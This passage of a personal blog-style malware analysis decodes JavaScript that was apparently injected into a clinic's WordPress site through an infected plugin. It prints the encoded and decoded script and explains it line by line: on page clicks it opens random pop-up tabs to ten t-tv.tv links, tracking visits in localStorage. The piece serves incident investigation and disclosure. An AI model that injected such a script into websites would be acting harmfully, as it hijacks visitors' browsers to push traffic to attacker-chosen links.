20%20%20%20%63%6F%6E%73%74%20%72%65%73%74%4D%69%6E%75%74%65%73%20%3D%20%31%3B%0D%0A%20%20%20%20%2F%2F%20%4E%75%6D%62%65%72%20%6F%66%20%68%6F%75%72%73%20%74%6F%20%61%6C%6C%6F%77%20%72%65%2D%63%6C%69%63%6B%20%0D%0A%20%20%20%20%63%6F%6E%73%74%20%61%6C%6C%6F%77%65%64%48%6F%75%72%73%20%3D%20%32%3B%0D%0A%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%20%3D%20%28%74%61%72%67%65%74%73%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%74%61%72%67%65%74%73%2E%66%6F%72%45%61%63%68%28%28%74%61%72%67%65%74%2C%20%69%6E%64%65%78%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%21%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%29%29%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%09%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%2C%20%30%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%20%3D%20%28%74%61%72%67%65%74%73%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%6F%6E%56%69%73%69%74%65%64%20%3D%20%74%61%72%67%65%74%73%2E%66%69%6C%74%65%72%28%28%74%61%72%67%65%74%2C%20%69%6E%64%65%78%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%29%20%3D%3D%20%30%29%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%6E%6F%6E%56%69%73%69%74%65%64%5B%4D%61%74%68%2E%66%6C%6F%6F%72%28%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%20%2A%20%6E%6F%6E%56%69%73%69%74%65%64%2E%6C%65%6E%67%74%68%29%5D%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%63%6F%6E%73%74%20%73%65%74%4C%6F%63%61%74%69%6F%6E%41%73%56%69%73%69%74%65%64%20%3D%20%28%74%61%72%67%65%74%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%2C%20%31%29%3B%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%54%69%6D%65%53%74%6F%72%61%67%65%20%3D%20%28%6B%65%79%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%60%24%7B%6B%65%79%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%29%3B%0D%0A%20%20%20%20%63%6F%6E%73%74%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%20%3D%20%28%6B%65%79%2C%20%6E%6F%77%44%61%74%65%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%60%24%7B%6B%65%79%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%48%6F%75%72%73%44%69%66%66%20%3D%20%28%73%74%61%72%74%44%61%74%65%2C%20%65%6E%64%44%61%74%65%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%73%49%6E%48%6F%75%72%20%3D%20%31%30%30%30%20%2A%20%36%30%20%2A%20%36%30%3B%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%4D%61%74%68%2E%72%6F%75%6E%64%28%4D%61%74%68%2E%61%62%73%28%65%6E%64%44%61%74%65%20%2D%20%73%74%61%72%74%44%61%74%65%29%20%2F%20%6D%73%49%6E%48%6F%75%72%29%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%4D%69%6E%74%73%44%69%66%66%20%3D%20%28%73%74%61%72%74%44%61%74%65%2C%20%65%6E%64%44%61%74%65%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%73%49%6E%4D%69%6E%74%73%20%3D%20%31%30%30%30%20%2A%20%36%30%3B%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%4D%61%74%68%2E%72%6F%75%6E%64%28%4D%61%74%68%2E%61%62%73%28%65%6E%64%44%61%74%65%20%2D%20%73%74%61%72%74%44%61%74%65%29%20%2F%20%6D%73%49%6E%4D%69%6E%74%73%29%3B%0D%0A%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%76%69%73%69%74%4E%65%77%4C%6F%63%61%74%69%6F%6E%20%3D%20%28%74%61%72%67%65%74%73%2C%20%68%6F%73%74%2C%20%6E%6F%77%44%61%74%65%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%6E%65%77%4C%6F%63%61%74%69%6F%6E%20%3D%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%6D%6E%74%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%68%75%72%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%73%65%74%4C%6F%63%61%74%69%6F%6E%41%73%56%69%73%69%74%65%64%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%29%3B%0D%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%70%65%6E%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%2C%20%22%5F%62%6C%61%6E%6B%22%29%3B%0D%0A%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%2F%2F%20%63%6F%6E%73%74%20%72%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%20%3D%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%0D%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%67%6C%6F%62%61%6C%43%6C%69%63%6B%28%65%76%65%6E%74%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%65%76%65%6E%74%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%68%6F%73%74%20%3D%20%6C%6F%63%61%74%69%6F%6E%2E%68%6F%73%74%3B%0D%0A%20%20%20%20%20%20%20%20%6C%65%74%20%6E%65%77%4C%6F%63%61%74%69%6F%6E%20%3D%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%6F%77%44%61%74%65%20%3D%20%44%61%74%65%2E%70%61%72%73%65%28%6E%65%77%20%44%61%74%65%28%29%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%61%76%65%64%44%61%74%65%46%6F%72%4D%69%6E%74%73%20%3D%20%67%65%74%54%69%6D%65%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%6D%6E%74%73%60%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%61%76%65%64%44%61%74%65%46%6F%72%48%6F%75%72%73%20%3D%20%67%65%74%54%69%6D%65%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%68%75%72%73%60%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%69%66%20%28%73%61%76%65%64%44%61%74%65%46%6F%72%4D%69%6E%74%73%20%26%26%20%73%61%76%65%64%44%61%74%65%46%6F%72%48%6F%75%72%73%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%4D%69%6E%74%73%20%3D%20%70%61%72%73%65%49%6E%74%28%73%61%76%65%64%44%61%74%65%46%6F%72%4D%69%6E%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%48%6F%75%72%73%20%3D%20%70%61%72%73%65%49%6E%74%28%73%61%76%65%64%44%61%74%65%46%6F%72%48%6F%75%72%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%69%6E%74%73%44%69%66%66%20%3D%20%67%65%74%4D%69%6E%74%73%44%69%66%66%28%6E%6F%77%44%61%74%65%2C%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%4D%69%6E%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%68%6F%75%72%73%44%69%66%66%20%3D%20%67%65%74%48%6F%75%72%73%44%69%66%66%28%6E%6F%77%44%61%74%65%2C%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%48%6F%75%72%73%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%68%6F%75%72%73%44%69%66%66%20%3E%3D%20%61%6C%6C%6F%77%65%64%48%6F%75%72%73%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%68%75%72%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6D%69%6E%74%73%44%69%66%66%20%3E%3D%20%72%65%73%74%4D%69%6E%75%74%65%73%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%6D%6E%74%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%70%65%6E%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%2C%20%22%5F%62%6C%61%6E%6B%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%4C%6F%63%61%74%69%6F%6E%41%73%56%69%73%69%74%65%64%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%20%28%65%72%72%6F%72%29%20%7B%20%76%69%73%69%74%4E%65%77%4C%6F%63%61%74%69%6F%6E%28%74%61%72%67%65%74%73%2C%20%68%6F%73%74%2C%20%6E%6F%77%44%61%74%65%29%3B%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%20%65%6C%73%65%20%7B%20%76%69%73%69%74%4E%65%77%4C%6F%63%61%74%69%6F%6E%28%74%61%72%67%65%74%73%2C%20%68%6F%73%74%2C%20%6E%6F%77%44%61%74%65%29%3B%20%7D%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%67%6C%6F%62%61%6C%43%6C%69%63%6B%29%0D%0A%7D%29%28%29%3C%2F%73%63%72%69%70%74%3E"))</script>
```

which can be ultimately translated to this: 

```javascript
function (parameters) {
     const targets = ['https://t-tv.tv/GnG0c6', 'https://t-tv.tv/yyg1c0', 'https://t-tv.tv/icD2c4', 'https://t-tv.tv/Cji3c5', 'https://t-tv.tv/hii4c1', 'https://t-tv.tv/oEY5c0', 'https://t-tv.tv/Cww6c7', 'https://t-tv.tv/gLo7c2', 'https://t-tv.tv/kyG8c4', 'https://t-tv.tv/jTm9c4'];
    // Times between clicks
    const restMinutes = 1;
    // Number of hours to allow re-click
    const allowedHours = 2;
    const saveTargetLocationsToStorage = (targets) => { 
             targets.forEach((target, _) => {
                if(!localStorage.getItem(`${target}-local-storage`)){         
                    localStorage.setItem(`${target}-local-storage`, 0);            
                }        
            });  
    }
    const getRandomLocationFromStorage = (targets) => {        
        const nonVisited = targets.filter((target, _) => localStorage.getItem(`${target}-local-storage`) == 0)       
        return nonVisited[Math.floor(Math.random() * nonVisited.length)];    
    }
    
    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);    
    
    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);    

    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);    
    
    const getHoursDiff = (startDate, endDate) => {        
        const msInHour = 1000 * 60 * 60;        
        return Math.round(Math.abs(endDate - startDate) / msInHour);   
    }    
    
    const getMintsDiff = (startDate, endDate) => {        
        const msInMints = 1000 * 60;        
        return Math.round(Math.abs(endDate - startDate) / msInMints);    
    }    
    
    const visitNewLocation = (targets, host, nowDate) => {
            saveTargetLocationsToStorage(targets);       
            newLocation = getRandomLocationFromStorage(targets);        
            setTimeToStorage(`${host}-mnts`, nowDate);        
            setTimeToStorage(`${host}-hurs`, nowDate);        
            setLocationAsVisited(newLocation);        
            window.open(newLocation, "_blank");    
    };

} 

// const randomLocation = getRandomLocationFromStorage(targets);
saveTargetLocationsToStorage(targets);
function globalClick(event) {
    event.stopPropagation();        
    const host = location.host;        
    let newLocation = getRandomLocationFromStorage(targets);        
    const nowDate = Date.parse(new Date());        
    const savedDateForMints = getTimeStorage(`${host}-mnts`);        
    const savedDateForHours = getTimeStorage(`${host}-hurs`);        
    if (savedDateForMints && savedDateForHours) {            
        try {                
            const storageDateForMints = parseInt(savedDateForMints);                
            const storageDateForHours = parseInt(savedDateForHours);         
            const mintsDiff = getMintsDiff(nowDate, storageDateForMints);    
            const hoursDiff = getHoursDiff(nowDate, storageDateForHours);              
            if (hoursDiff >= allowedHours) {                    
                saveTargetLocationsToStorage(targets);    
                setTimeToStorage(`${host}-hurs`, nowDate);    
            }                
            if (mintsDiff >= restMinutes) {             
                if (newLocation) {                       
                    setTimeToStorage(`${host}-mnts`, nowDate);
                    window.open(newLocation, "_blank");
                    setLocationAsVisited(newLocation);                    
                }                
            }            
        } catch (error) { 
            visitNewLocation(targets, host, nowDate); }      
        } else { visitNewLocation(targets, host, nowDate); }    
}
document.addEventListener("click", globalClick);
```

## The Code 
The code's functionality is to pop-up of a webpage (target) after clicking on screen at random intervals to simulate human browsing behavior. More specifically, every 1 minute, a click will automatically open a new page from a set list. 

The function starts by defining an array of URL targets called targets, which is a list of ten different URLs. The `restMinutes` and `allowedHours` constants specify the time intervals between clicks and the minimum time between clicks, respectively.
```javascript
function (parameters) {
     const targets = ['https://t-tv.tv/GnG0c6', 'https://t-tv.tv/yyg1c0', 'https://t-tv.tv/icD2c4', 'https://t-tv.tv/Cji3c5', 'https://t-tv.tv/hii4c1', 'https://t-tv.tv/oEY5c0', 'https://t-tv.tv/Cww6c7', 'https://t-tv.tv/gLo7c2', 'https://t-tv.tv/kyG8c4', 'https://t-tv.tv/jTm9c4'];
    // Times between clicks
    const restMinutes = 1;
    // Number of hours to allow re-click
    const allowedHours = 2;
```

The next function defined is `saveTargetLocationsToStorage`, which takes the targets array as an argument and loops through each URL. If the URL is not already saved in local storage, it sets the URL as a key in local storage and sets the value to `0`.
```javascript
    const saveTargetLocationsToStorage = (targets) => { 
             targets.forEach((target, _) => {
                if(!localStorage.getItem(`${target}-local-storage`)){         
                    localStorage.setItem(`${target}-local-storage`, 0);            
                }        
            });  
    }
```

The `getRandomLocationFromStorage` function takes the targets array as an argument and returns a randomly selected URL from the list of URLs that have not been visited yet. It filters out any URLs that have already been visited by checking their corresponding value in local storage.
```javascript
    const getRandomLocationFromStorage = (targets) => {        
        const nonVisited = targets.filter((target, _) => localStorage.getItem(`${target}-local-storage`) == 0)       
        return nonVisited[Math.floor(Math.random() * nonVisited.length)];    
    }
```
The `setLocationAsVisited` function takes a target URL as an argument and sets the corresponding key in local storage to `1` to indicate that the URL has been visited.
```javascript
const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);    
```

The `getTimeStorage` function takes a key as an argument and returns the value stored in local storage for that key.
```javascript
const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);    
```

The `setTimeToStorage` function takes a key and a date as arguments and sets the corresponding key in local storage to the provided date.
```javascript
const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);    
```

The `getHoursDiff` and `getMintsDiff` functions calculate the difference between two dates in hours and minutes, respectively.
```javascript
const getHoursDiff = (startDate, endDate) => {        
    const msInHour = 1000 * 60 * 60;        
    return Math.round(Math.abs(endDate - startDate) / msInHour);   
}    

const getMintsDiff = (startDate, endDate) => {        
    const msInMints = 1000 * 60;        
    return Math.round(Math.abs(endDate - startDate) / msInMints);    
}    
```

The `visitNewLocation` function takes the targets array, the host URL, and the current date as arguments. It first saves the list of URLs to local storage and gets a randomly selected URL from the list using the `getRandomLocationFromStorage` function. It then sets the current time to the local storage keys for minutes and hours and sets the selected URL as visited. Finally, it opens the selected URL in a new window.
```javascript
const visitNewLocation = (targets, host, nowDate) => {
        saveTargetLocationsToStorage(targets);       
        newLocation = getRandomLocationFromStorage(targets);        
        setTimeToStorage(`${host}-mnts`, nowDate);        
        setTimeToStorage(`${host}-hurs`, nowDate);        
        setLocationAsVisited(newLocation);        
        window.open(newLocation, "_blank");    
};
```

The `globalClick` function is triggered when the user clicks anywhere on the page. It stops the event propagation, gets the current host URL, gets the current date, and gets the last time a URL was visited for minutes and hours. It then calculates the difference in time between the current date and the last visit and checks if the time since the last visit is greater than or equal to the specified time intervals. If it is, it selects a new URL and opens it in a new window. If not, it does nothing.
```javascript
function globalClick(event) {
    event.stopPropagation();        
    const host = location.host;        
    let newLocation = getRandomLocationFromStorage(targets);        
    const nowDate = Date.parse(new Date());        
    const savedDateForMints = getTimeStorage(`${host}-mnts`);        
    const savedDateForHours = getTimeStorage(`${host}-hurs`);        
    if (savedDateForMints && savedDateForHours) {            
        try {                
            const storageDateForMints = parseInt(savedDateForMints);                
            const storageDateForHours = parseInt(savedDateForHours);         
            const mintsDiff = getMintsDiff(nowDate, storageDateForMints);    
            const hoursDiff = getHoursDiff(nowDate, storageDateForHours);              
            if (hoursDiff >= allowedHours) {                    
                saveTargetLocationsToStorage(targets);    
                setTimeToStorage(`${host}-hurs`, nowDate);    
            }                
            if (mintsDiff >= restMinutes) {             
                if (newLocation) {                       
                    setTimeToStorage(`${host}-mnts`, nowDate);
                    window.open(newLocation, "_blank");
                    setLocationAsVisited(newLocation);                    
                }                
            }            
        } catch (error) { 
            visitNewLocation(targets, host, nowDate); }      
    } else { visitNewLocation(targets, host, nowDate); }    
}
```

Finally, the `document.addEventListener("click", globalClick);` line adds an event listener to the document object that triggers the `globalClick` function whenever the user clicks on the page.
```javascript
document.addEventListener("click", globalClick);
```


Screenshot of my local storage when I was investigating this:
<div align="center">
<img src="/img/local_storage_javascript_injection.png" width="120%" alt="First level solved!">
</div>

## Conclusion

It appears that the issue was caused by an infected WordPress plugin. Upon conducting some research, I discovered that the same code was present in two repositories on GitHub:

- [Wordpress-malware](https://github.com/stefanpejcic/wordpress-malware/blob/1c7a209916540c3bf8440fc1f6febfab7a6864bc/08.02.2023/readme.html#L1): a collection of discovered WordPress malware, which supports my initial hypothesis.
- [DefacerPh](https://github.com/mkdirlove/DefacerPH/blob/main/Deface%20Pages/cdph.html#LL1): this repository belongs to a security group based in the Philippines called DefacerPH. It seems kinda sus tbh. Maybe they were the responsibles for this code. 

After discovering the issue, I contacted the clinic and provided them with my findings. Thankfully, they were able to fix the problem within two weeks, resulting in a happy ending.

That was quite fun ngl. 